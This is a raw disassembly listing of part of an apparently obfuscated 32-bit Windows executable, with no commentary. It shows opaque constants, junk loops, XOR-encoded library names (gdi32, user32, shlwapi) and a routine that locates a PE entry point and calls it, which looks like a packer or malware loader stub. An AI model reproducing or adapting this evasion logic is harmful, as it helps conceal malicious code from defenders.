  42497a:	push   0x429c4a
  42497f:	push   0x429c6a
  424984:	call   esi
  424986:	imul   eax,eax,0x300000
  42498c:	cmp    eax,0x1b00000
  424991:	jne    0x423b7e
  424997:	lea    eax,[esp+0x1b8]
  42499e:	push   eax
  42499f:	push   0x429ca6
  4249a4:	call   DWORD PTR ds:0x42a3e6
  4249aa:	cmp    eax,0xffffffff
  4249ad:	jne    0x423b7e
  4249b3:	lea    eax,[esp+0x78]
  4249b7:	push   eax
  4249b8:	push   0x429c92
  4249bd:	call   DWORD PTR ds:0x42a3c6
  4249c3:	cmp    eax,0xffffffff
  4249c6:	jne    0x423b7e
  4249cc:	push   0xf
  4249ce:	lea    eax,[esp+0x44]
  4249d2:	push   eax
  4249d3:	push   0x429ce6
  4249d8:	push   0x429cfa
  4249dd:	push   0x429d1a
  4249e2:	call   esi
  4249e4:	imul   eax,eax,0x300000
  4249ea:	cmp    eax,0x1b00000
  4249ef:	jne    0x423b7e
  4249f5:	lea    eax,[esp+0x1b8]
  4249fc:	push   eax
  4249fd:	push   0x429d56
  424a02:	call   DWORD PTR ds:0x42a3e6
  424a08:	cmp    eax,0xffffffff
  424a0b:	jne    0x423b7e
  424a11:	lea    eax,[esp+0x78]
  424a15:	push   eax
  424a16:	push   0x429d42
  424a1b:	call   DWORD PTR ds:0x42a3c6
  424a21:	cmp    eax,0xffffffff
  424a24:	jne    0x423b7e
  424a2a:	push   0xf
  424a2c:	lea    eax,[esp+0x44]
  424a30:	push   eax
  424a31:	push   0x429d96
  424a36:	push   0x429daa
  424a3b:	push   0x429dca
  424a40:	call   esi
  424a42:	imul   eax,eax,0x300000
  424a48:	cmp    eax,0x1b00000
  424a4d:	jne    0x423b7e
  424a53:	lea    eax,[esp+0x1b8]
  424a5a:	push   eax
  424a5b:	push   0x429e06
  424a60:	call   DWORD PTR ds:0x42a3e6
  424a66:	cmp    eax,0xffffffff
  424a69:	jne    0x423b7e
  424a6f:	lea    eax,[esp+0x78]
  424a73:	push   eax
  424a74:	push   0x429df2
  424a79:	call   DWORD PTR ds:0x42a3c6
  424a7f:	cmp    eax,0xffffffff
  424a82:	jne    0x423b7e
  424a88:	push   0xf
  424a8a:	lea    eax,[esp+0x44]
  424a8e:	push   eax
  424a8f:	push   0x429e46
  424a94:	push   0x429e5a
  424a99:	push   0x429e7a
  424a9e:	call   esi
  424aa0:	imul   eax,eax,0x300000
  424aa6:	cmp    eax,0x1b00000
  424aab:	jne    0x423b7e
  424ab1:	lea    eax,[esp+0x1b8]
  424ab8:	push   eax
  424ab9:	push   0x429eb6
  424abe:	call   DWORD PTR ds:0x42a3e6
  424ac4:	cmp    eax,0xffffffff
  424ac7:	jne    0x423b7e
  424acd:	mov    eax,DWORD PTR [esp+0x3c]
  424ad1:	cmp    eax,0xf89c85ba
  424ad6:	je     0x424b35
  424adc:	mov    eax,DWORD PTR [esp+0x20]
  424ae0:	mov    ecx,DWORD PTR [esp+0x38]
  424ae4:	xor    eax,edi
  424ae6:	add    eax,ebx
  424ae8:	cmp    eax,ecx
  424aea:	je     0x424b35
  424af0:	mov    eax,ds:0x42941e
  424af5:	mov    eax,DWORD PTR [eax+0x194]
  424afb:	mov    ecx,DWORD PTR [eax]
  424afd:	mov    eax,DWORD PTR [ecx+0x3c]
  424b00:	push   DWORD PTR ds:0x4294fe
  424b06:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  424b0a:	push   DWORD PTR ds:0x4292a2
  424b10:	add    eax,ecx
  424b12:	mov    ecx,DWORD PTR ds:0x42941e
  424b18:	mov    ecx,DWORD PTR [ecx+0x194]
  424b1e:	push   DWORD PTR [ecx]
  424b20:	call   eax
  424b22:	mov    ecx,DWORD PTR ds:0x42941e
  424b28:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424b2e:	mov    DWORD PTR [ecx],eax
  424b30:	jmp    0x424d62
  424b35:	mov    eax,DWORD PTR [esp+0x20]
  424b39:	mov    ecx,DWORD PTR [esp+0x60]
  424b3d:	xor    eax,edi
  424b3f:	add    eax,ebx
  424b41:	cmp    eax,ecx
  424b43:	jne    0x424bac
  424b49:	mov    eax,DWORD PTR [esp+0x20]
  424b4d:	mov    ecx,DWORD PTR ds:0x42941e
  424b53:	mov    ecx,DWORD PTR [ecx+0x198]
  424b59:	xor    eax,edi
  424b5b:	add    eax,ebx
  424b5d:	cmp    eax,DWORD PTR [ecx]
  424b5f:	jne    0x424b85
  424b65:	mov    eax,DWORD PTR [esp+0x20]
  424b69:	push   0xf89c85a5
  424b6e:	xor    eax,edi
  424b70:	add    eax,ebx
  424b72:	push   eax
  424b73:	push   0xf89c85b9
  424b78:	push   DWORD PTR [esp+0x18]
  424b7c:	push   DWORD PTR [esp+0x30]
  424b80:	call   0x423466
  424b85:	push   DWORD PTR [esp+0xc]
  424b89:	push   DWORD PTR [esp+0x24]
  424b8d:	call   0x401000
  424b92:	mov    eax,DWORD PTR [esp+0x20]
  424b96:	xor    eax,edi
  424b98:	add    eax,ebx
  424b9a:	mov    ds:0x4294aa,eax
  424b9f:	mov    eax,DWORD PTR [esp+0x20]
  424ba3:	xor    eax,edi
  424ba5:	add    eax,ebx
  424ba7:	mov    ds:0x4294a2,eax
  424bac:	mov    eax,DWORD PTR [esp+0x2c]
  424bb0:	test   eax,eax
  424bb2:	je     0x424d62
  424bb8:	lea    eax,[esp+0x78]
  424bbc:	mov    DWORD PTR [esp+0x64],0xf152c32
  424bc4:	push   eax
  424bc5:	mov    DWORD PTR [esp+0x78],0x712ed2f
  424bcd:	mov    DWORD PTR [esp+0x74],0x373fc0d
  424bd5:	push   0x429ea2
  424bda:	mov    DWORD PTR [esp+0x70],0x72670add
  424be2:	call   DWORD PTR ds:0x42a3c6
  424be8:	cmp    eax,0xffffffff
  424beb:	jne    0x423b7e
  424bf1:	push   0xf
  424bf3:	lea    eax,[esp+0x44]
  424bf7:	push   eax
  424bf8:	push   0x429ef6
  424bfd:	push   0x429f0a
  424c02:	push   0x429f2a
  424c07:	call   esi
  424c09:	imul   eax,eax,0x300000
  424c0f:	cmp    eax,0x1b00000
  424c14:	jne    0x423b7e
  424c1a:	lea    eax,[esp+0x1b8]
  424c21:	push   eax
  424c22:	push   0x429f66
  424c27:	call   DWORD PTR ds:0x42a3e6
  424c2d:	cmp    eax,0xffffffff
  424c30:	jne    0x423b7e
  424c36:	call   0x4230eb
  424c3b:	mov    eax,DWORD PTR [esp+0x34]
  424c3f:	mov    eax,DWORD PTR [esp+0xc]
  424c43:	mov    DWORD PTR [esp+0x30],eax
  424c47:	mov    eax,DWORD PTR [esp+0x20]
  424c4b:	mov    DWORD PTR [esp+0xc],eax
  424c4f:	mov    eax,eax
  424c51:	mov    eax,ds:0x42941e
  424c56:	mov    ecx,DWORD PTR [eax+0x1c0]
  424c5c:	mov    edx,DWORD PTR [ecx]
  424c5e:	and    DWORD PTR [esp+0x1c],0x0
  424c63:	mov    esi,0xfabdbed8
  424c68:	add    edx,esi
  424c6a:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424c6f:	mov    ecx,0x8a29a13d
  424c74:	xor    edx,ecx
  424c76:	mov    DWORD PTR [esp+0x10],edx
  424c7a:	mov    edx,DWORD PTR [esp+0x1c]
  424c7e:	xor    edx,0x0
  424c81:	cmp    DWORD PTR [esp+0x10],0x70941fe4
  424c89:	mov    DWORD PTR [esp+0x14],edx
  424c8d:	jne    0x424c9c
  424c93:	cmp    edx,0xffffffff
  424c96:	je     0x424d05
  424c9c:	mov    eax,DWORD PTR [eax+0x1c8]
  424ca2:	mov    eax,DWORD PTR [eax]
  424ca4:	cdq    
  424ca5:	add    eax,esi
  424ca7:	adc    edx,0xffffffff
  424caa:	and    DWORD PTR [esp+0x1c],0x0
  424caf:	xor    edx,0x0
  424cb2:	mov    DWORD PTR [esp+0x24],edx
  424cb6:	mov    edx,DWORD PTR [esp+0xc]
  424cba:	mov    DWORD PTR [esp+0x18],edx
  424cbe:	xor    eax,ecx
  424cc0:	add    DWORD PTR [esp+0x18],esi
  424cc4:	mov    edx,DWORD PTR [esp+0x18]
  424cc8:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424ccd:	xor    edx,ecx
  424ccf:	mov    DWORD PTR [esp+0x10],edx
  424cd3:	mov    edx,DWORD PTR [esp+0x1c]
  424cd7:	xor    edx,0x0
  424cda:	mov    DWORD PTR [esp+0x14],edx
  424cde:	cmp    DWORD PTR [esp+0x10],eax
  424ce2:	jne    0x424cf4
  424ce8:	mov    eax,DWORD PTR [esp+0x24]
  424cec:	cmp    edx,eax
  424cee:	je     0x424d05
  424cf4:	mov    eax,DWORD PTR [esp+0xc]
  424cf8:	add    eax,DWORD PTR [esp+0x30]
  424cfc:	mov    DWORD PTR [esp+0xc],eax
  424d00:	jmp    0x424d62
  424d05:	mov    eax,ds:0x4294a2
  424d0a:	mov    edx,DWORD PTR ds:0x4294aa
  424d10:	xor    eax,edx
  424d12:	mov    ds:0x4294a2,eax
  424d17:	mov    edx,DWORD PTR ds:0x4294a2
  424d1d:	mov    eax,DWORD PTR [esp+0x2c]
  424d21:	add    DWORD PTR [eax],edx
  424d23:	mov    edx,DWORD PTR [esp+0xc]
  424d27:	mov    eax,ds:0x4294a2
  424d2c:	xor    edx,edi
  424d2e:	add    edx,ebx
  424d30:	xor    ebx,ebx
  424d32:	add    edx,esi
  424d34:	adc    ebx,0xffffffff
  424d37:	xor    edi,edi
  424d39:	xor    edx,ecx
  424d3b:	xor    ebx,0x0
  424d3e:	add    eax,esi
  424d40:	adc    edi,0xffffffff
  424d43:	xor    eax,ecx
  424d45:	xor    edi,0x0
  424d48:	cmp    eax,edx
  424d4a:	jne    0x424d62
  424d50:	cmp    edi,ebx
  424d52:	jne    0x424d62
  424d58:	mov    eax,ds:0x4294a2
  424d5d:	mov    ds:0x4294aa,eax
  424d62:	lea    eax,[esp+0x78]
  424d66:	push   eax
  424d67:	push   0x429f52
  424d6c:	call   DWORD PTR ds:0x42a3c6
  424d72:	cmp    eax,0xffffffff
  424d75:	jne    0x423b7e
  424d7b:	push   0xf
  424d7d:	lea    eax,[esp+0x44]
  424d81:	push   eax
  424d82:	push   0x429fa6
  424d87:	push   0x429fba
  424d8c:	push   0x429fda
  424d91:	call   DWORD PTR ds:0x42a3fe
  424d97:	imul   eax,eax,0x300000
  424d9d:	cmp    eax,0x1b00000
  424da2:	jne    0x423b7e
  424da8:	lea    eax,[esp+0x1b8]
  424daf:	push   eax
  424db0:	push   0x42a006
  424db5:	call   DWORD PTR ds:0x42a3e6
  424dbb:	cmp    eax,0xffffffff
  424dbe:	jne    0x423b7e
  424dc4:	mov    eax,ds:0x42941e
  424dc9:	push   0x4
  424dcb:	add    eax,0x1cc
  424dd0:	push   eax
  424dd1:	lea    eax,[esp+0x3c]
  424dd5:	push   eax
  424dd6:	call   0x424dea
  424ddb:	mov    eax,DWORD PTR [esp+0x34]
  424ddf:	mov    eax,DWORD PTR [eax]
  424de1:	pop    edi
  424de2:	pop    esi
  424de3:	pop    ebx
  424de4:	mov    esp,ebp
  424de6:	pop    ebp
  424de7:	ret    0xc
  424dea:	push   ebp
  424deb:	mov    ebp,esp
  424ded:	sub    esp,0x10
  424df0:	and    DWORD PTR ds:0x42a2ea,0x0
  424dfa:	mov    ecx,DWORD PTR ds:0x42a2ea
  424e00:	inc    ecx
  424e01:	mov    DWORD PTR ds:0x42a2ea,ecx
  424e07:	cmp    DWORD PTR ds:0x42a2ea,0x8
  424e0e:	jg     0x424e5a
  424e14:	jmp    0x424e33
  424e19:	push   0x42a27e
  424e1e:	push   0x3925
  424e23:	push   0x42912e
  424e28:	push   0x429024
  424e2d:	call   DWORD PTR ds:0x42a3ea
  424e33:	cmp    DWORD PTR ds:0x42a2ea,0x7
  424e3a:	jne    0x424e4d
  424e40:	mov    ecx,DWORD PTR ds:0x42a2ea
  424e46:	inc    ecx
  424e47:	mov    DWORD PTR ds:0x42a2ea,ecx
  424e4d:	cmp    DWORD PTR ds:0x42a2ea,0x1f
  424e54:	jb     0x424dfa
  424e5a:	mov    eax,0xf89c85a5
  424e5f:	mov    DWORD PTR [ebp-0x4],eax
  424e62:	xor    ecx,ecx
  424e64:	xor    ecx,DWORD PTR ds:0x42a34a
  424e6a:	mov    edx,DWORD PTR ds:0x42a396
  424e70:	sub    ecx,edx
  424e72:	add    ecx,DWORD PTR [ecx+edx*1]
  424e75:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  424e7c:	mov    edx,DWORD PTR ds:0x42a36a
  424e82:	mov    ecx,DWORD PTR ds:0x42a37a
  424e88:	sub    ecx,edx
  424e8a:	or     edx,DWORD PTR [edx+ecx*1]
  424e8d:	mov    ecx,DWORD PTR [ebp-0x4]
  424e90:	push   esi
  424e91:	mov    edx,0x75108aa
  424e96:	movzx  esi,BYTE PTR ds:0x42a286
  424e9d:	add    DWORD PTR ds:0x42a29a,esi
  424ea3:	xor    ecx,edx
  424ea5:	mov    esi,0x3272f1
  424eaa:	xor    DWORD PTR ds:0x42a2b2,0x42a27e
  424eb4:	push   edi
  424eb5:	sbb    DWORD PTR ds:0x42a2ee,0x42a29a
  424ebf:	mov    edi,DWORD PTR [ebp+0x10]
  424ec2:	add    ecx,esi
  424ec4:	cmp    ecx,edi
  424ec6:	mov    DWORD PTR ds:0x42a2e6,0x5270
  424ed0:	je     0x425044
  424ed6:	mov    ecx,DWORD PTR [ebp-0x4]
  424ed9:	and    DWORD PTR ds:0x42a2a2,edx
  424edf:	mov    edi,DWORD PTR [ebp+0x10]
  424ee2:	add    DWORD PTR ds:0x42a272,0x5748
  424eec:	xor    eax,eax
  424eee:	xor    DWORD PTR ds:0x42a26a,0x1416
  424ef8:	xor    ecx,edx
  424efa:	sbb    DWORD PTR ds:0x42a292,0x6e41
  424f04:	add    ecx,esi
  424f06:	adc    DWORD PTR ds:0x42a2de,0x42a2f2
  424f10:	add    edi,0xfabdbed8
  424f16:	adc    eax,0xffffffff
  424f19:	mov    DWORD PTR ds:0x42a2f6,0x6318
  424f23:	xor    eax,0x0
  424f26:	sbb    DWORD PTR ds:0x42a27e,0x42a2de
  424f30:	mov    DWORD PTR [ebp-0xc],eax
  424f33:	inc    DWORD PTR ds:0x42a27e
  424f39:	push   ebx
  424f3a:	xor    DWORD PTR ds:0x42a28e,edi
  424f40:	xor    ebx,ebx
  424f42:	neg    eax
  424f44:	xor    edi,0x8a29a13d
  424f4a:	and    DWORD PTR ds:0x42a2be,0x0
  424f54:	mov    eax,ds:0x42a2be
  424f59:	inc    eax
  424f5a:	mov    ds:0x42a2be,eax
  424f5f:	cmp    DWORD PTR ds:0x42a2be,0x9
  424f66:	jg     0x424fa9
  424f6c:	jmp    0x424f84
  424f71:	push   0x8c5e
  424f76:	push   0x42a2a2
  424f7b:	push   DWORD PTR [ebp-0x10]
  424f7e:	call   DWORD PTR ds:0x42a3ee
  424f84:	cmp    DWORD PTR ds:0x42a2be,0x8
  424f8b:	jne    0x424f9c
  424f91:	mov    eax,ds:0x42a2be
  424f96:	inc    eax
  424f97:	mov    ds:0x42a2be,eax
  424f9c:	cmp    DWORD PTR ds:0x42a2be,0x18
  424fa3:	jb     0x424f54
  424fa9:	mov    eax,ecx
  424fab:	add    eax,0xfabdbed8
  424fb0:	adc    ebx,0xffffffff
  424fb3:	xor    eax,0x8a29a13d
  424fb8:	xor    ebx,0x0
  424fbb:	cmp    eax,edi
  424fbd:	jne    0x424fd6
  424fc3:	cmp    ebx,DWORD PTR [ebp-0xc]
  424fc6:	je     0x42503e
  424fcc:	jmp    0x424fd6
  424fd1:	mov    esi,0x3272f1
  424fd6:	mov    eax,DWORD PTR [ebp-0x4]
  424fd9:	mov    edi,DWORD PTR [ebp-0x8]
  424fdc:	xor    edi,edx
  424fde:	add    edi,esi
  424fe0:	mov    esi,DWORD PTR [ebp+0x8]
  424fe3:	imul   edi,ecx
  424fe6:	mov    ebx,DWORD PTR [ebp+0xc]
  424fe9:	xor    eax,edx
  424feb:	add    eax,ecx
  424fed:	mov    al,BYTE PTR [ebx+eax*1+0x3272f1]
  424ff4:	mov    BYTE PTR [edi+esi*1],al
  424ff7:	mov    eax,DWORD PTR [ebp-0x8]
  424ffa:	mov    esi,DWORD PTR [ebp+0x10]
  424ffd:	xor    eax,edx
  424fff:	xor    ebx,ebx
  425001:	add    esi,0xfabdbed8
  425007:	adc    ebx,0xffffffff
  42500a:	lea    ecx,[ecx+eax*1+0x3272f1]
  425011:	xor    edi,edi
  425013:	xor    esi,0x8a29a13d
  425019:	xor    ebx,0x0
  42501c:	mov    eax,ecx
  42501e:	add    eax,0xfabdbed8
  425023:	adc    edi,0xffffffff
  425026:	xor    eax,0x8a29a13d
  42502b:	xor    edi,0x0
  42502e:	cmp    eax,esi
  425030:	jne    0x424fd1
  425036:	cmp    edi,ebx
  425038:	jne    0x424fd1
  42503e:	mov    eax,0xf89c85ba
  425043:	pop    ebx
  425044:	pop    edi
  425045:	pop    esi
  425046:	leave  
  425047:	ret    0xc
  42504a:	push   ebp
  42504b:	mov    ebp,esp
  42504d:	push   ecx
  42504e:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  425055:	or     DWORD PTR ds:0x42a292,0x42a2d6
  42505f:	mov    eax,DWORD PTR [ebp+0x8]
  425062:	xor    edx,edx
  425064:	add    edx,DWORD PTR ds:0x42a3a6
  42506a:	mov    ecx,DWORD PTR ds:0x42a3ae
  425070:	sub    edx,ecx
  425072:	sub    edx,DWORD PTR [edx+ecx*1]
  425075:	movsx  eax,BYTE PTR [eax]
  425078:	mov    edx,0x3272f1
  42507d:	sub    eax,edx
  42507f:	movzx  ecx,BYTE PTR ds:0x42a2a6
  425086:	or     DWORD PTR ds:0x42a2ce,ecx
  42508c:	mov    ecx,0x75108aa
  425091:	and    DWORD PTR ds:0x42a2d2,0x2b27
  42509b:	xor    eax,ecx
  42509d:	cmp    eax,0xf89c85f6
  4250a2:	mov    DWORD PTR ds:0x42a28e,0x60e7
  4250ac:	jne    0x4250ff
  4250b2:	xor    eax,eax
  4250b4:	xor    eax,DWORD PTR ds:0x42a26a
  4250ba:	xor    DWORD PTR ds:0x42a2ba,eax
  4250c0:	mov    eax,DWORD PTR [ebp+0x8]
  4250c3:	mov    DWORD PTR ds:0x42a2d6,0x3461
  4250cd:	push   esi
  4250ce:	mov    esi,DWORD PTR ds:0x42a262
  4250d4:	adc    DWORD PTR ds:0x42a256,esi
  4250da:	mov    esi,DWORD PTR [ebp+0x8]
  4250dd:	add    esi,DWORD PTR [eax+0x3c]
  4250e0:	mov    DWORD PTR [ebp+0x8],esi
  4250e3:	mov    eax,DWORD PTR [ebp-0x4]
  4250e6:	mov    esi,DWORD PTR [ebp+0x8]
  4250e9:	xor    eax,ecx
  4250eb:	add    eax,edx
  4250ed:	cmp    DWORD PTR [esi+0x54],eax
  4250f0:	pop    esi
  4250f1:	je     0x4250ff
  4250f7:	mov    eax,DWORD PTR [ebp+0x8]
  4250fa:	jmp    0x425106
  4250ff:	mov    eax,DWORD PTR [ebp-0x4]
  425102:	xor    eax,ecx
  425104:	add    eax,edx
  425106:	leave  
  425107:	ret    0x4
  42510a:	push   ebp
  42510b:	mov    ebp,esp
  42510d:	sub    esp,0xc
  425110:	and    DWORD PTR ds:0x42a2da,0x0
  42511a:	jmp    0x42512e
  42511f:	xor    edx,edx
  425121:	or     edx,DWORD PTR ds:0x42a2da
  425127:	inc    edx
  425128:	mov    DWORD PTR ds:0x42a2da,edx
  42512e:	cmp    DWORD PTR ds:0x42a2da,0x1c
  425135:	jae    0x42517a
  42513b:	cmp    DWORD PTR ds:0x42a2da,0x7
  425142:	jg     0x42517a
  425148:	jmp    0x42515b
  42514d:	push   DWORD PTR [ebp-0x10]
  425150:	push   0x42a276
  425155:	call   DWORD PTR ds:0x42a3f2
  42515b:	cmp    DWORD PTR ds:0x42a2da,0x6
  425162:	jne    0x425175
  425168:	mov    edx,DWORD PTR ds:0x42a2da
  42516e:	inc    edx
  42516f:	mov    DWORD PTR ds:0x42a2da,edx
  425175:	jmp    0x42511f
  42517a:	push   esi
  42517b:	sub    esi,0x6177
  425181:	mov    esi,0xf89c85a5
  425186:	and    DWORD PTR ds:0x42a26a,0x14cd
  425190:	mov    DWORD PTR [ebp-0x8],esi
  425193:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  42519a:	and    DWORD PTR ds:0x42a2e2,ebx
  4251a0:	push   edi
  4251a1:	mov    eax,eax
  4251a3:	or     ecx,0x7f14
  4251a9:	mov    eax,DWORD PTR [ebp-0x4]
  4251ac:	add    ecx,edi
  4251ae:	mov    edi,DWORD PTR [ebp-0x8]
  4251b1:	or     edx,edx
  4251b3:	mov    ecx,0x75108aa
  4251b8:	and    DWORD PTR ds:0x42a2da,0x0
  4251c2:	jmp    0x4251d4
  4251c7:	mov    edx,DWORD PTR ds:0x42a2da
  4251cd:	inc    edx
  4251ce:	mov    DWORD PTR ds:0x42a2da,edx
  4251d4:	cmp    DWORD PTR ds:0x42a2da,0x1d
  4251db:	jae    0x42521d
  4251e1:	cmp    DWORD PTR ds:0x42a2da,0xd
  4251e8:	jge    0x42521d
  4251ee:	jmp    0x4251fe
  4251f3:	push   0x42a2d2
  4251f8:	call   DWORD PTR ds:0x42a3f6
  4251fe:	cmp    DWORD PTR ds:0x42a2da,0xc
  425205:	jne    0x425218
  42520b:	mov    edx,DWORD PTR ds:0x42a2da
  425211:	inc    edx
  425212:	mov    DWORD PTR ds:0x42a2da,edx
  425218:	jmp    0x4251c7
  42521d:	xor    eax,ecx
  42521f:	xor    edi,ecx
  425221:	mov    edx,0x3272f1
  425226:	add    edi,edx
  425228:	add    eax,edx
  42522a:	imul   eax,edi
  42522d:	mov    edi,DWORD PTR [ebp+0xc]
  425230:	cmp    edi,eax
  425232:	je     0x425287
  425238:	mov    DWORD PTR [ebp-0xc],esi
  42523b:	mov    eax,DWORD PTR [ebp-0xc]
  42523e:	mov    esi,DWORD PTR [ebp+0xc]
  425241:	xor    eax,ecx
  425243:	lea    eax,[eax*8+0x1939800]
  42524a:	mov    eax,DWORD PTR [esi+eax*1]
  42524d:	mov    DWORD PTR [ebp+0xc],eax
  425250:	mov    eax,DWORD PTR [ebp-0x4]
  425253:	mov    esi,DWORD PTR [ebp-0x8]
  425256:	xor    eax,ecx
  425258:	xor    esi,ecx
  42525a:	add    esi,edx
  42525c:	add    eax,edx
  42525e:	imul   eax,esi
  425261:	mov    esi,DWORD PTR [ebp+0xc]
  425264:	cmp    esi,eax
  425266:	je     0x425287
  42526c:	mov    eax,DWORD PTR [ebp-0x4]
  42526f:	xor    eax,ecx
  425271:	mov    ecx,DWORD PTR [ebp+0xc]
  425274:	add    eax,edx
  425276:	imul   eax,ecx
  425279:	add    eax,DWORD PTR [ebp+0x8]
  42527c:	mov    DWORD PTR [ebp+0xc],eax
  42527f:	mov    eax,DWORD PTR [ebp+0xc]
  425282:	jmp    0x425298
  425287:	mov    eax,DWORD PTR [ebp-0x4]
  42528a:	mov    esi,DWORD PTR [ebp-0x8]
  42528d:	xor    esi,ecx
  42528f:	xor    eax,ecx
  425291:	add    esi,edx
  425293:	add    eax,edx
  425295:	imul   eax,esi
  425298:	pop    edi
  425299:	pop    esi
  42529a:	leave  
  42529b:	ret    0x8
  42529e:	add    BYTE PTR [eax],al
  4252a0:	add    BYTE PTR [eax],al
  4252a2:	add    BYTE PTR [eax],al
  4252a4:	mov    ch,0x45
  4252a6:	out    0x4d,al
  4252a8:	add    BYTE PTR [eax],al
  4252aa:	add    BYTE PTR [eax],al
  4252ac:	add    al,BYTE PTR [eax]
  4252ae:	add    BYTE PTR [eax],al
  4252b0:	xor    BYTE PTR [eax],al
  4252b2:	add    BYTE PTR [eax],al
  4252b4:	rcl    BYTE PTR [edx+0x2],0x0
  4252b8:	rol    BYTE PTR [esi+0x2],0x0
  4252bc:	add    BYTE PTR [eax],al
  4252be:	add    BYTE PTR [eax],al
  4252c0:	push   edx
  4252c1:	push   ebx
  4252c2:	inc    esp
  4252c3:	push   ebx
  4252c4:	mov    ds:0x6db26422,eax
  4252c9:	retf   0x48d9
  4252cc:	mov    dl,0xa2
  4252ce:	or     bh,BYTE PTR [edi-0x69]
  4252d1:	push   ebp
  4252d2:	loope  0x42527d
  4252d4:	add    DWORD PTR [eax],eax
  4252d6:	add    BYTE PTR [eax],al
  4252d8:	inc    esi
  4252d9:	cmp    bl,BYTE PTR [edi+edx*2+0x69]
  4252dd:	outs   dx,BYTE PTR ds:[esi]
  4252de:	outs   dx,DWORD PTR fs:[esi]
  4252e0:	ja     0x425355
  4252e2:	and    BYTE PTR [ecx+ebp*2+0x72],al
  4252e6:	pop    esp
  4252e7:	inc    esi
  4252e8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x636578
  4252f0:	mov    edx,DWORD PTR [ebp-0x14]
  4252f3:	sub    esp,0x108
  4252f9:	push   ebx
  4252fa:	mov    eax,ebx
  4252fc:	xchg   ecx,eax
  4252fd:	mov    eax,DWORD PTR [ebp+0x8]
  425300:	cmp    eax,0xf89c85a5
  425305:	jne    0x4257bf
  42530b:	mov    eax,DWORD PTR [ebp+0xc]
  42530e:	cmp    eax,0xf89c85ba
  425313:	jne    0x4257bf
  425319:	mov    eax,DWORD PTR [ebp+0x24]
  42531c:	mov    DWORD PTR [ebp-0x4],eax
  42531f:	mov    eax,DWORD PTR [ebp-0x4]
  425322:	mov    eax,DWORD PTR [eax+0x1d8]
  425328:	mov    eax,DWORD PTR [eax]
  42532a:	mov    eax,DWORD PTR [eax]
  42532c:	mov    DWORD PTR [ebp-0x8],eax
  42532f:	mov    BYTE PTR [ebp-0x18],0x1a
  425333:	mov    BYTE PTR [ebp-0x17],0x1f
  425337:	mov    BYTE PTR [ebp-0x16],0x14
  42533b:	mov    BYTE PTR [ebp-0x15],0x4e
  42533f:	mov    BYTE PTR [ebp-0x14],0x4d
  425343:	mov    BYTE PTR [ebp-0x13],0x83
  425347:	mov    BYTE PTR [ebp-0x20],0x8
  42534b:	mov    BYTE PTR [ebp-0x1f],0xe
  42534f:	mov    BYTE PTR [ebp-0x1e],0x18
  425353:	mov    BYTE PTR [ebp-0x1d],0xd
  425357:	mov    BYTE PTR [ebp-0x1c],0x4e
  42535b:	mov    BYTE PTR [ebp-0x1b],0x4d
  42535f:	mov    BYTE PTR [ebp-0x1a],0x83
  425363:	mov    BYTE PTR [ebp-0x28],0xe
  425367:	mov    BYTE PTR [ebp-0x27],0x1b
  42536b:	mov    BYTE PTR [ebp-0x26],0x17
  42536f:	mov    BYTE PTR [ebp-0x25],0xa
  425373:	mov    BYTE PTR [ebp-0x24],0x1c
  425377:	mov    BYTE PTR [ebp-0x23],0x13
  42537b:	mov    BYTE PTR [ebp-0x22],0x14
  42537f:	mov    BYTE PTR [ebp-0x21],0x83
  425383:	xor    ecx,ecx
  425385:	lea    eax,[ebp+ecx*1-0x18]
  425389:	movzx  edx,BYTE PTR [eax]
  42538c:	xor    edx,0x7c
  42538f:	inc    edx
  425390:	inc    ecx
  425391:	mov    BYTE PTR [eax],dl
  425393:	cmp    ecx,0x6
  425396:	jb     0x425385
  425398:	xor    ecx,ecx
  42539a:	lea    eax,[ebp+ecx*1-0x20]
  42539e:	movzx  edx,BYTE PTR [eax]
  4253a1:	xor    edx,0x7c
  4253a4:	inc    edx
  4253a5:	inc    ecx
  4253a6:	mov    BYTE PTR [eax],dl
  4253a8:	cmp    ecx,0x7
  4253ab:	jb     0x42539a
  4253ad:	xor    ecx,ecx
  4253af:	lea    eax,[ebp+ecx*1-0x28]
  4253b3:	movzx  edx,BYTE PTR [eax]
  4253b6:	xor    edx,0x7c
  4253b9:	inc    edx
  4253ba:	inc    ecx
  4253bb:	mov    BYTE PTR [eax],dl
  4253bd:	cmp    ecx,0x8
  4253c0:	jb     0x4253af
  4253c2:	lea    eax,[ebp-0x2c]
  4253c5:	mov    DWORD PTR [ebp-0x8],eax
  4253c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4253cb:	mov    eax,0x7113fccf
  4253d0:	mov    DWORD PTR [ecx],eax
  4253d2:	mov    ecx,DWORD PTR [ebp-0x2c]
  4253d5:	push   esi
  4253d6:	push   edi
  4253d7:	mov    esi,0x4e3e
  4253dc:	mov    ebx,0x3272f1
  4253e1:	cmp    ecx,eax
  4253e3:	jne    0x4254ae
  4253e9:	lea    eax,[esi+0x39]
  4253ec:	mov    WORD PTR [ebp-0x78],ax
  4253f0:	mov    eax,esi
  4253f2:	mov    WORD PTR [ebp-0x76],ax
  4253f6:	add    eax,0x33
  4253f9:	mov    WORD PTR [ebp-0x74],ax
  4253fd:	lea    eax,[esi-0xe]
  425400:	mov    WORD PTR [ebp-0x72],ax
  425404:	add    eax,0x4f
  425407:	mov    ecx,eax
  425409:	lea    eax,[esi-0x15]
  42540c:	mov    WORD PTR [ebp-0x66],ax
  425410:	mov    eax,esi
  425412:	mov    WORD PTR [ebp-0x64],ax
  425416:	add    eax,0xffffffec
  425419:	mov    WORD PTR [ebp-0x62],ax
  42541d:	mov    eax,0x443
  425422:	mov    WORD PTR [ebp-0x60],ax
  425426:	mov    eax,0x5674
  42542b:	mov    WORD PTR [ebp-0x5e],ax
  42542f:	mov    eax,0x6114
  425434:	mov    WORD PTR [ebp-0x5c],ax
  425438:	lea    eax,[ebp-0xe0]
  42543e:	push   eax
  42543f:	mov    eax,DWORD PTR [ebp+0xc]
  425442:	mov    edi,0x75108aa
  425447:	xor    eax,edi
  425449:	add    eax,ebx
  42544b:	push   eax
  42544c:	mov    WORD PTR [ebp-0x70],cx
  425450:	lea    ecx,[esi-0xa]
  425453:	mov    edx,ecx
  425455:	lea    eax,[ebp-0x78]
  425458:	push   eax
